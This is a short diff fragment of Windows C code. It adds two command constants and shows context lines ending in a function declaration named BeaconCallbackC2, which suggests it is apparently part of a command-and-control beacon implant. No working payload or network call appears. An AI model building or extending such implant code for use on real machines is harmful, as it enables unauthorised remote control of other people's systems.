@@ -1,3 +1,6 @@
+#define DATA_CMD_OUT 0x2000
+#define DATA_CMD_PRO 0x3000
+
 typedef void (WINAPI * RtlGetVersion_) (OSVERSIONINFOEXW *);
 
 LPCWSTR* BeaconCallbackC2(
